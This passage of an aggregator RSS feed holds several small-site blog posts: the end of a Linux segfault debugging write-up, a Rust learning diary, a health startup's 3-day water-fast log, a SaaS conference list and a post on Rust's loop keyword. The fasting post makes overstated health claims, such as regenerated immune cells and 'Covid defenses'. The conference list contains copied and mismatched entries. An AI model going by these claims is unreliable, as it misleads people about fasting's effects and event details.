 0x0000000000000001 (NEEDED)             Shared library: [libgcc_s.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
</pre>


<p>At this point I used ldd and readelf to walk through the tree of dependencies and figure out what was actually linking against the Samba libraries. I later learned that I could have installed lddtree (part of the pax-utils package) to do this automatically. Either way, this led me to discover that the Samba libraries were being included through libsmbclient, which was a dependency of libavformat (part of FFmpeg). libavformat is a dependency of libobs.</p>



<p>Repeating this experiment on Ubuntu showed that libavformat on Ubuntu does not depend on libsmbclient. This explains why I couldn’t reproduce the issue on Ubuntu. So why does Fedora’s (well, <a href="https://rpmfusion.org/" data-type="URL" data-id="https://rpmfusion.org/" target="_blank" rel="noreferrer noopener">RPM Fusion</a>‘s) version of libavformat depend on libsmbclient?</p>



<p>It turns out that it’s a compile-time option for FFmpeg. <a rel="noreferrer noopener" href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/libsmbclient.c" data-type="URL" data-id="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/libsmbclient.c" target="_blank">libavformat contains code for talking with Windows servers using libsmbclient</a>, but it’s an optional thing that you can choose to enable at compile time. Clearly Ubuntu chooses not to enable it, but RPM Fusion does. <a href="https://lists.rpmfusion.org/archives/list/rpmfusion-commits@lists.rpmfusion.org/thread/57UYP4VFY3VCJFU3DGPHLUE3JPYP73HJ/">Actually, I found the exact post on RPM Fusion’s commits mailing list</a> where the patch was added for enabling SMB support in FFmpeg. This patch is what led to the whole issue happening. If Ubuntu’s version of FFmpeg was being built with SMB support, we would have seen this a long time ago. This commit to RPM Fusion was made on December 31, 2020, which explains why rrondeau had only recently begun seeing the problem.</p>



<p>The root cause here is that the obs-ios-camera-source plugin was linking against two libraries that both provided a function named socket_send: libsamba-sockets-samba4 (indirectly through libobs) and libusbmuxd. libusbmuxd was being linked statically, but <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/62884945/shared-library-symbol-conflicts-and-static-linking-on-linux" data-type="URL" data-id="https://stackoverflow.com/questions/62884945/shared-library-symbol-conflicts-and-static-linking-on-linux" target="_blank">that doesn’t prevent functions in it from being resolved through dynamic linking rules anyway</a>. So even though libusbmuxd was a static library with its own internal implementation of socket_send, it was using …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/">https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/</a></em></p>]]>
            </description>
            <link>https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818126</guid>
            <pubDate>Mon, 18 Jan 2021 04:25:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Journey with Rust and Substrate]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25817475">thread link</a>) | @adibhanna
<br/>
January 17, 2021 | https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate | <a href="https://web.archive.org/web/*/https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A few months ago, I decided to learn <a href="https://www.rust-lang.org/">Rust</a>, mainly because I’m very interested in <a href="https://substrate.dev/">Substrate</a> (a Blockchain framework). At first, I thought it would be an easy task, and that it will take just a few days and I should be up and running. Well, that wasn’t the case, I really struggled with this language, it reminded me of my University days, studying C++, I felt like I don’t know what I’m doing, which is probably very true. </p><p>So, I decided to take a step back and have another take on this process, approach it a bit differently and in a more systematic way. On my first try, I simply went to the docs read everything, and tried some code. That didn’t really help much, it only made me more confused and less motivated.</p><p>The second time around, I decided to follow a “consistent motivation” approach - something that I came up with while writing this post. </p><p>Basically, whenever I feel lost and unmotivated, I’ll go watch some YouTube videos that would excite me. </p><p>Here are some of my favorite: </p><ul><li><p><a href="https://www.youtube.com/channel/UC4ZfpU7QX3iSatYB2GDum5Q">rhymu8354</a></p></li><li><p><a href="https://www.youtube.com/channel/UC_iD0xppBwwsrM9DegC5cQQ">Jon Gjengset</a></p></li><li><p><a href="https://www.youtube.com/channel/UCDmSWx6SK0zCU2NqPJ0VmDQ">David Pedersen</a></p></li></ul><ul><li><p>Read the Rust docs, all of it, without trying any of their coding examples, I just wanted to get a feel of what’s going on in this language - the story behind it. That helped my intuition for whenever I read Rust code. </p></li><li><p>Watched a TON of YouTube videos. I found a bunch of great channels of devs streaming themselves learning and coding Rust. That was inspiring and gave me the desire and motivation to actually try to code things myself.</p></li><li><p>Followed the top Rust accounts on Twitter. The goal was to keep myself up to date with all things Rust. They also share great resources and blog posts.</p></li><li><p>Re-read the Rust docs again, this time I tried all the code they provided, and I spent a lot of time familiarising myself with its syntax.</p></li><li><p>Read as many blog posts as I can find.</p></li><li><p>Read all of Substrate <a href="https://github.com/paritytech/substrate">codebase</a> on Github.</p></li><li><p>Build something with Substrate. </p></li></ul><h2>Lesson Learned</h2><ul><li><p>Don’t give up quickly.</p></li><li><p>Realize that learning takes time.</p></li><li><p>You’re not the only person struggling with learning new things.</p></li><li><p>Read other people’s code (!important).</p></li><li><p>READ THE DOCS.</p></li><li><p>CODE CODE CODE.</p></li></ul><ul><li><p>Great Udemy Course https://www.udemy.com/course/rust-lang/ </p></li><li><p>Official Rust docs https://doc.rust-lang.org/book</p></li><li><p>Rust by example https://doc.rust-lang.org/stable/rust-by-example</p></li></ul><ul><li><p>Substrate Crowdcasts https://www.crowdcast.io/e/substrate-seminar</p></li><li><p>Substrates Tutorials, Knowledge base, and Recipes https://substrate.dev/en/</p></li><li><p>Substrate Developer Hub https://github.com/substrate-developer-hub</p></li><li><p>Polkadot docs https://wiki.polkadot.network/en</p></li></ul><p>This is my first blog post ever, I hope it helps someone with their coding journey. Oh, and I’m definitely open to any feedback that could help me improve the quality of what I’m sharing on this blog. </p><p>Cheers! </p></div></div>]]>
            </description>
            <link>https://blog.adibhanna.com/p/my-journey-with-rust-and-substrate</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817475</guid>
            <pubDate>Mon, 18 Jan 2021 02:24:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Body on a 3-day fast: Real-time data with Basis]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25817380">thread link</a>) | @TheJurgen
<br/>
January 17, 2021 | https://basishealth.io/blog/real-time-fasting-data-with-basis | <a href="https://web.archive.org/web/*/https://basishealth.io/blog/real-time-fasting-data-with-basis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="single-content-content"><p>Caloric restriction is the practice of taking fewer calories than total daily energy needs. Caloric restriction without malnutrition is the most effective non-pharmacological intervention that enhances longevity and healthspan in numerous species. It has been proven to reduce oxidative stress through various pathways and a growing body of evidence shows that sustained periods of caloric restriction without malnutrition improves risk factors involved in the pathophysiology of type 2 diabetes, cardiovascular diseases, cancer, and neurological disorders in humans. (Weindruch, 1996)</p><p>But chronic caloric restriction is difficult to sustain and newer dietary strategies such as intermittent fasting and protein restriction have emerged as alternative approaches that still improve markers of aging. The most popular type of caloric restriction applied today is a 16:8 Time-Restricted Feeding schedule i.e. no eating for 16 hours, eat for 8 hours. While difficult for some to get started, Intermittent Fasting is generally easy to adopt and has important short and long-term health benefits such as metabolic, cardiovascular, and digestive health benefits. </p><p>Multi-day fasting is another form of fasting with a higher detoxifying effect that activates important an important cellular restoration process called autophagy. Autophagy is a super useful process that recycles, cleans up, and rids your body of damaged and misfolded proteins. When your cells are constantly fed, they aren't worried about efficiency and restoration - they're thinking that 'times are good, we don't need to work hard anymore.' In a well-fed state, your cells are only concerned with growing. Besides putting all their emphasis on growth, your well-fed cells also turn other genes off such as those related to fat metabolism, stress resistance, and damage repair. </p><p>During fasting (starvation), things are very different. We have a well-preserved starvation “program” that kicks our cell into a completely different state when food, particularly glucose or sugar, isn’t around. Your body reacts to the newfound stress by waking up cell functions to protect you and as a result, starts acting more efficiently and dynamically. This 'reactivation' of the cellular system leads to lowered inflammation, increases your brain's resistance to stress, and many other important long-term health benefits.</p><h2>So, what happens to your body on a fast?</h2><p>At Basis, we wanted to put the science to the test and really see what happens in real-time to your body when you’re following a prolonged fast. So I volunteered to be the guinea pig by spending last week doing a 3-day water fast and tracking my vitals in real-time with Basis to see the impact it has on my body.</p><p><img alt="Fasting data" src="https://images.ctfassets.net/xxkgr6gh5t72/3gyIfqHoGt8Iegl8jOcKxR/2eed6467ced1c30d17ca5fd14d27fbf3/Fasting_real_time_.png"></p><p>The Basis app added an extra layer of health confidence for me because I was getting real-time glucose data from my biosensor and could identify if I was going into a hypoglycemic attack; my wearable was connected to Basis and was giving me real-time heart rate data, and I was tracking my hydration and running a once-a-day urinalysis test in Basis to confirm that I wasn’t dealing with dehydration. In Basis, I was also getting my sleep reports for each night, including a time-specific snapshot of my glucose and heart rate - something of particular interest since more than 40% of hypoglycemic events happen during sleep. </p><p>For data sharing purposes, I also did a pre- and post-fast blood panel. You can see a table with the biomarkers I tested for at the top of this post. I've also provided body composition data because I'm sure most people think of fasting for weight loss purposes. </p><p>Disclaimer: Speak with your doctor before undertaking any type of fasting with or without Basis. Your doctor will advise you if any pre-existing condition or abnormalities in your biomarkers could create complications.</p><p>Without further ado, let’s jump into the Basis real-time data along with an explanation of the cellular process that happens as you hit different intervals in your fast. </p><h3><b>DAY 1</b></h3><p>Loading Chart</p><p>Glucose: Low 75 / High 119 / Average 94 </p><p>Glucose Variability: 10.31</p><p>Heart-rate: Low 49 / High 96 / Average 62</p><br><h4><b>12 hours - Hello ketosis. </b></h4><p>In this state, your body starts to break down and burn fat. This process creates ketones which serve as an alternative energy source when glucose isn’t available. </p><br><h4><b>18 hours - Fat-burning mode.</b> </h4><p>I'm now generating significant ketones and I can now begin to measure blood ketone levels above baseline values. Under normal conditions, the concentration of ketones in your plasma ranges below 20 mg/dL but when you fast this concentration can reach 80+ mg/dL. My ketones measured at 32 mg/dL compared to 80 mg/dL for my glucose. </p><br><h4><b>24 hours - Autophagy</b></h4><p>Autophagy can only happen when your glucose stores are significantly low. In humans, that usually happens after 24 hours of fasting. (Alirezaei et al., Autophagy 2010)</p><h3><b>DAY 2</b></h3><p>Loading Chart</p><p>Glucose: Low 69 / High 107 / Average 85 </p><p>Glucose variability: 9.96</p><p>Heart-rate: Low 45 / High 97 / Average 62 </p><br><h4><b>48 hours - Peak growth hormone</b> </h4><p>Growth hormone helps preserve lean muscle mass and reduces fat tissue accumulation, particularly as we age. It also appears to promote wound healing and cardiovascular health. After two days of fasting, the large number of circulating ketone bodies and the impact of ghrelin, the hunger hormone, promote increased growth hormone secretion (Hartman et al.,1992). </p><p>At this point in the fast, my glucose line is virtually flat, ranging between 75 - 85 mg/dL and I'm preserving my energy for essential activities and work. </p><h3><b>DAY 3</b></h3><p>Loading Chart</p><p>Glucose: Low 69 / High 90 / Average 78 </p><p>Glucose variability: 8.27</p><p>Heart-rate: Low 50 / High 120 / Average 64 </p><br><h4><b>72 hours - Checkpoint. </b></h4><p>At the 3-day mark, I've hit a key milestone in cellular regeneration. My body has broken down old immune cells and generated new ones (Cheng et al., 2014). Getting those Covid defenses up! Interestingly, through this same mechanism, prolonged fasting for at least 72 hours has been shown to also preserve healthy white blood cell or lymphocyte counts in patients undergoing chemotherapy. </p><p>Last ketone measurement before breaking the fast. Approaching the 80 mg/dL along with a 79mg/dL glucose level measurement.  </p><br><h4><b>Bonus stage: Refeeding!</b></h4><p>The fast isn’t done until you get some food back in your body. The most important thing to remember is that you should resist the temptation to chow down on a pizza or a burger because as amazing as that may seem in the moment, and trust me the temptation is always there, after 3 days of just sipping on water, it will feel absolutely terrible afterward. Your stomach has for all-intensive purposes shrunk and hasn’t gone through the process of digesting anything for 3 days. You’ll get bad stomach cramping and spend quite a bit of time in the bathroom if you eat a carb-heavy meal. </p><p>Beyond this practical reason, it’s important to break your fast with a nutritious, balanced meal that will further enhance the all-around cell and tissue health-boosting exercise you just undertook. </p><h3><b>Looking for a clearer view of your health?</b></h3><p><a href="https://basishealth.typeform.com/to/ovy5RnER">Sign up</a> for the Basis Early Access Beta and discover what having real-time access to your health data means. </p></div></div>]]>
            </description>
            <link>https://basishealth.io/blog/real-time-fasting-data-with-basis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817380</guid>
            <pubDate>Mon, 18 Jan 2021 02:04:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2021 Virtual SaaS conferences list]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25817035">thread link</a>) | @item21153
<br/>
January 17, 2021 | https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list | <a href="https://web.archive.org/web/*/https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="blog-text"><p>The SaaS market is booming with the industry expected to reach $220.21 billion by 2022.</p><p>Whether you're an entrepreneur, SaaS founder or someone looking to innovate in your company, then attending one of these many SaaS conferences should be in your 2021 agenda.</p><p>But before you get too excited, know you're not going to be seated amongst an electric crowd, entranced by a booming voice like the image above.</p><p>Instead, expect a more pandemic-friendly alternative this year.</p><p>To help you out, we've compiled a list of the must-see online SaaS conferences you need to attend this year.</p><h2>Full list</h2><ul role="list"><li><a href="https://summit.productled.com/" target="_blank">Product-Led Summit </a>- January 26-28, 2021</li><li><a href="https://productschool.com/productcon/february/" target="_blank">ProductCon</a> - February 18th, 2021</li><li><a href="https://www.saastock.com/" target="_blank">SaaStock Remote</a> - February 23-25, 2021</li><li><a href="https://www.sxsw.com/" target="_blank">SXSW Online</a> - March 16-20, 2021</li><li><a href="https://theuxconf.com/" target="_blank">UX Conference</a> - March 1-2, 2021</li><li><a href="https://summit.adobe.com/na/" target="_blank">Adobe Summit</a> - April 13-15, 2021</li><li><a href="https://www.contentmarketingconference.com/" target="_blank">Content Marketing Annual Conference</a> - April 27-29, 2021</li><li><a href="https://www.ibm.com/events/think/" target="_blank">IBM Think 2021</a> - May 2021</li><li><a href="https://dublintechsummit.tech/" target="_blank">Dublin Tech Summit</a> - June 17th, 2021</li><li><a href="https://moz.com/mozcon" target="_blank">MozCon</a> - July 11-14, 2021</li><li><a href="https://www.inbound.com/2021" target="_blank">Inbound</a> - September 7-10, 2021</li><li><a href="https://techcrunch.com/events/techcrunch-disrupt-2021/#6141988e-b433-4082-ad44-e4b86a66c471" target="_blank">TechCrunch Disrupt</a> - &nbsp;September 21-23, 2021</li><li><a href="https://www.saastrannual2021.com/" target="_blank">SaaStr Annual 2021</a> - September 28-29, 2021</li><li><a href="https://websummit.com/" target="_blank">Websummit</a> - November 1-4, 2021</li></ul><p>‍</p><h2><strong>January</strong></h2><h4><a href="https://summit.productled.com/" target="_blank"><strong>Product-Led Summit—Virtual</strong></a><strong> </strong>- January 26-28, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe969e164b8421dea4ea33_Untitled.png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>If you're interested in product-led growth across customer onboarding, pricing strategies and retention acquisition, the online ProductLed Summit is for you. Over 250 of product trailblazers will teach you how to build a product-led growth company. These sessions are practical and exclusive so don't miss out!</p><p>‍</p><h2>February</h2><h4><a href="https://productschool.com/productcon/february/" target="_blank"><strong>ProductCon </strong></a>- February 18th, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe96d36a9726d18c3bf964_Untitled%20(1).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>ProductCon this year will highlight leaders from diverse backgrounds who have led the Product Industry. Over 15,000 inspirational speakers from leading tech companies such as Spotify, Amazon, Netflix and more.</p><p>‍</p><h4><a href="https://www.saastock.com/" target="_blank"><strong>SaaStock Remote</strong></a><strong> - February 23-25, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe96e6b92dbbad7b0de146_Untitled%20(2).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: US$59</p><p>SaaStock is showcasing SaaS founders, executives, and investors to share their experiences and tactics in a series of practical content sessions and workshops. Learn about the Saas market like never before and find the road to ultimate growth.</p><p>Other SaaStock events look out for:</p><ul role="list"><li>Online SaaStock LatAm - May 6 2021</li><li>Online SaaStock EMEA - October 11-13 2021</li><li>Online SaaStock APAC - September 2 2021</li></ul><p>‍</p><h2>March</h2><h4><a href="https://www.sxsw.com/" target="_blank"><strong>SXSW Online</strong></a><strong> - March 16-20, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe9702322c898da8c5eb8b_Untitled%20(3).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: $249</p><p>What to expect:</p><p>SXSW has invited reknown experts across industries such as business, tech, education, music and entertainment. From Film Festival screenings, networking opportunities, online exhibitions, and conference sessions, you will be spoilt for choice!</p><p>‍</p><h4><a href="https://theuxconf.com/" target="_blank"><strong>UX Conference</strong></a><strong> - March 1-2, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97201aacfc4913255a39_The-UX-Conference-1.jpg" loading="lazy" alt=""></p></figure><p>Timezone: UK</p><p>Price: £94.80</p><p>A two day immersive remote conference that hosts real-time online events. Learn from designers with experience working at 1Password, Amazon, Babylon, Discovery, Dropbox, Figma, Google, InVision, Shopify, TfL, Uber, what3words and more.</p><p>‍</p><h2><strong>April</strong></h2><h4><a href="https://summit.adobe.com/na/" target="_blank"><strong>Adobe Summit</strong></a><strong> - April 13-15, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe973e3e95d23737217b11_Untitled%20(4).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>Come to this three-days conference if you are interested in optimising your customer experience, led by SaaS marketing experts, content managers and leading advertisers. Learn how to create positive and seamless experiences for customers with data and design through 200 sessions across campaign management, content creation, Adobe Experience Platform and Content Creation.</p><h4><a href="https://www.contentmarketingconference.com/" target="_blank"><strong>Content Marketing Annual Conference</strong></a> - April 27-29, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe975437f33b0701c1f594_Untitled%20(5).png" loading="lazy" alt=""></p></figure><p>Timezone: Eastern Standard Time</p><p>Price: &nbsp;US$799</p><p>Interested in content marketing? This conference is for you. Also enjoy the networking sessions with fellow content &amp;&nbsp;Saas marketers. Don't forget the benefits such as CMC 365 where you will have access to a plethora of educational content such as recordings, templates, guides and certified masterclasses.</p><h2><strong>May</strong></h2><h4><a href="https://www.ibm.com/events/think/" target="_blank"><strong>IBM Think 2021</strong></a> - May 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe977601a63b1d3e1280d8_Untitled%20(6).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>IBM Think is not an event to be missed! If you are working in IT, learn about the latest developments in data, blockchain, hybrid cloud and artificial intelligence. Stay ahead of the future with the best minds the industry.</p><p>‍</p><h2>June</h2><h4><a href="https://dublintechsummit.tech/" target="_blank"><strong>Dublin Tech Summit</strong></a><strong> </strong>- June 17th, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe9794ab4e52356b48dc2a_Untitled%20(7).png" loading="lazy" alt=""></p></figure><p>Timezone: Greenwich Mean time</p><p>Price: TBA</p><p>Dublin Tech Summit Virtual will feature more than 80 leading technology and business leaders from around the world. Participate in speaker panels and discover new ways to fast-track your business with speakers from HuaWei, NASA and Etsy.</p><p>‍</p><h2>July</h2><h4><a href="https://moz.com/mozcon" target="_blank"><strong>MozCon</strong></a> - July 11-14, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97ac322c8930c8c5ed39_Untitled%20(8).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: US$149</p><p>Dublin Tech Summit Virtual will feature more than 80 leading technology and business leaders from around the world to present on trends, findings and network with other great minds. Participate in speaker panels and discover new ways to fast-track your business with speakers from HuaWei, NASA and Etsy.</p><p>‍</p><h2>September</h2><h4><a href="https://www.inbound.com/2021" target="_blank"><strong>Inbound</strong></a> - September 7-10, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe8b838d5cbf3b1b0ab4cd_inbound-2021.png" alt="https://cdn.smartkarrot.com/wp-content/uploads/2021/01/inbound-2021.png"></p></figure><p>Timezone: Pacific Time</p><p>Price: US$49</p><p>INBOUND 2021 is an illuminative experience over four days, with experts across the globe, including networking sessions and high-energy talks. Hear from 250 professionals in product management, SaaS marketing and B2C/B2B startups.</p><h4><a href="https://techcrunch.com/events/techcrunch-disrupt-2021/#6141988e-b433-4082-ad44-e4b86a66c471" target="_blank"><strong>TechCrunch Disrupt</strong></a><strong> </strong>- &nbsp;September 21-23, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97e695a0a926fdf8c869_Untitled%20(9).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>TechCrunch Disrupt is three days of action-packed events with two segments: founders &amp; investors breaking barriers through disruptive technologies and ideas &amp; startup leaders providing valuable insights to entrepreneurs. With 10,000 attendees from around the globe, its guaranteed to be worth your time.</p><h4><a href="https://www.saastrannual2021.com/" target="_blank"><strong>SaaStr Annual 2021</strong></a> - September 28-29, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97f837f33b15d6c1f7eb_Untitled%20(10).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>SaaStr Annual is an online conference for SaaS founders, executives, and entrepreneurs looking to get enlightening advice to grow their business from $0 to $100M ARR. Sit in on many instructional workshops and mentoring opportunities from renowned SaaS leaders.</p><p>‍</p><h2>December</h2><h4><a href="https://websummit.com/" target="_blank"><strong>Websummit</strong></a> - November 1-4, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97ff417a3ed1fe7fb7ef_Untitled%20(11).png" loading="lazy" alt=""></p></figure><p>Timezone: Western European Standard Time</p><p>Price: 2 for 1 tickets for €850</p><p>Touted as 'the best technology conference on the planet' by Forbes, listen to 1100 tech speakers from companies such as Zoom, 23andMe, Facebook and Paypal - you won't regret it.</p><p>‍</p><p>That's a wrap for 2021! </p><p>And if, like us, you tend to scribble down notes from these events, <a href="https://meetric.app/">check out</a> what we're building.</p><p>‍</p><p>if you enjoyed this post, please do share the Twitter thread:</p></div></div></div>]]>
            </description>
            <link>https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817035</guid>
            <pubDate>Mon, 18 Jan 2021 01:00:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unconditional Loops Are Unconditionally Awesome]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25816502">thread link</a>) | @brson
<br/>
January 17, 2021 | https://brson.github.io/2021/01/17/rust-unconditional-loops | <a href="https://web.archive.org/web/*/https://brson.github.io/2021/01/17/rust-unconditional-loops">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Here’s a thing I don’t see appreciated enough about Rust: <code>loop</code>.
I know I don’t think about it all that much,
but pretty much every time I use it I feel a bit of satisfaction.</p>

<p><code>loop</code> is just an unconditional loop:
it loops forever, or until you write <code>break</code>, or <code>return</code>.</p>

<p>Most languages don’t have it.</p>

<p>Instead, loop constructs usually have some kind of termination condition,
your <code>while</code> and <code>for</code> loops.
Apparently <em><a href="https://en.wikipedia.org/wiki/Sather">Sather</a></em> has an unconditional <code>loop</code> keyword like Rust.
I only know this because a programming language historian mentioned it <a href="https://github.com/rust-lang/rust/issues/1906#issuecomment-4240501">on the bug tracker</a>.</p>

<p>Why do I love <code>loop</code>?</p>

<p>Because it frees me from thinking about how to end a loop
before I’ve even started writing it.</p>

<p>Many problems are easy to recognize as ones that require a looping solution:
I quickly realize, “I have to do something multiple times”.</p>

<p>Sometimes that loop just involves iterating over a container of things,
one at a time.
That’s easy to recognize as a <code>for thing in things { }</code> situation.
Other loops have more complex conditions though.
Often when I’m solving a looping problem,
I will know one or some of the steps I intend to do in a loop,
but will not envision the complete solution ahead of time.</p>

<p>So I just write</p>



<p>and start coding what I do know needs to happen,
and work from there.</p>

<p>For some reason this feels great.</p>

<p>Once I have solved my looping problem,
there will be a <code>break</code> or <code>return</code> somewhere in there,
or multiple <code>break</code>s and/or <code>return</code>s.
Maybe it makes sense to convert it into a <code>while</code> loop,
maybe not. But there’s not a great need
for <code>while</code> when you’ve got <code>loop</code>, <code>break</code>, and <code>return</code>.
Do readers really need to know the loop termination condition
before reading what happens in the loop?
Or, in languages with <code>do { } while (…)</code> loops,
after the very end of the loop?
I don’t know,
but writing the termination condition
naturally wherever it “wants” to live in the loop
seems reasonable to me.
One does though need to be considerate of
their readers by keeping the loop body a readable length.</p>

<p>Anecdotally, a small project I’m working on right now
contains 2 instances of <code>loop</code>, 2 of <a href="https://doc.rust-lang.org/rust-by-example/flow_control/while_let.html"><code>while let</code></a>,
and 8 of <code>for … in</code>;
no standard <code>while</code> loops.
And I think the <code>loop</code> loops read better than if I had
tried to convert them to <code>while</code> loops.</p>

<p>Here’s one example:</p>

<div><div><pre><code><span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>async_channel</span><span>::</span><span>unbounded</span><span>();</span>
<span>let</span> <span>handle</span> <span>=</span> <span>thread</span><span>::</span><span>spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span>
    <span>let</span> <span>mut</span> <span>context</span> <span>=</span> <span>FsThreadContext</span><span>::</span><span>new</span><span>();</span>
    <span>loop</span> <span>{</span>
        <span>let</span> <span>msg</span> <span>=</span> <span>block_on</span><span>(</span><span>rx</span><span>.recv</span><span>())</span><span>.expect</span><span>(</span><span>"recv"</span><span>);</span>
        <span>match</span> <span>msg</span> <span>{</span>
            <span>Message</span><span>::</span><span>Run</span><span>(</span><span>f</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>f</span><span>(</span><span>&amp;</span><span>mut</span> <span>context</span><span>);</span>
            <span>},</span>
            <span>Message</span><span>::</span><span>Shutdown</span><span>(</span><span>rsp_tx</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>context</span><span>.shutdown</span><span>();</span>
                <span>rsp_tx</span><span>.send</span><span>(())</span><span>.expect</span><span>(</span><span>"send"</span><span>);</span>
                <span>break</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>});</span>
</code></pre></div></div>

<p>Here’s the other:</p>

<div><div><pre><code><span>let</span> <span>mut</span> <span>header</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
<span>let</span> <span>mut</span> <span>line</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>

<span>loop</span> <span>{</span>
    <span>line</span><span>.truncate</span><span>(</span><span>0</span><span>);</span>
    <span>io</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>line</span><span>)</span><span>?</span><span>;</span>

    <span>if</span> <span>line</span><span>.is_empty</span><span>()</span> <span>{</span>
        <span>return</span> <span>Err</span><span>(</span><span>anyhow!</span><span>(</span><span>"broken frame header"</span><span>));</span>
    <span>}</span>

    <span>let</span> <span>maybe_body_marker</span> <span>=</span> <span>&amp;</span><span>line</span><span>[</span><span>..</span><span>line</span><span>.len</span><span>()</span> <span>-</span> <span>1</span><span>];</span>
    <span>if</span> <span>maybe_body_marker</span> <span>==</span> <span>FRAME_BODY_MARKER</span> <span>{</span>
        <span>break</span><span>;</span>
    <span>}</span>

    <span>header</span><span>.push_str</span><span>(</span><span>&amp;</span><span>line</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>It’s common in C-like languages to write an unconditional loop
with <code>while (true) { }</code>.</p>

<p>I’m steeped enough in Rust that I don’t know if writing <code>while (true) { }</code>
brings others the same satisfaction as I get from <code>loop { }</code>,
but I suspect not: it looks and feels just like a tiny bit of a hack.
And if I go into writing a loop by first writing <code>while …</code>
then I am immediately presented with the question,
“while <em>what</em>?”,
and sometimes I just don’t want to think about that yet.</p>

<p>Besides <em>feeling</em> good,
there is <a href="https://github.com/rust-lang/rust/issues/1906">a technical reason that Rust has <code>loop</code></a>:
it helps analyze control flow.
With it, the compiler can trivially know that any code
after the loop is unreachable.
In Rust at least this is important for type checking.
This kind of analysis <em>is done</em> in other languages,
but by my recollection they sometimes actually
special case <code>while (true) { }</code> for this purpose.</p>

<p>Here’s an example of the differences in how Rust
treats <code>loop</code> vs. <code>while true</code> <a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=010dce12fdd4c0818322717e161a2f91">on the playground</a>.
Run it and check out the warning the compiler
issues; try to alter the example as suggested in the comments.</p>

<p>Bonus Rust trivia:
did you know that <code>loop</code> is an expression,
with the same type as its <code>break</code> statements,
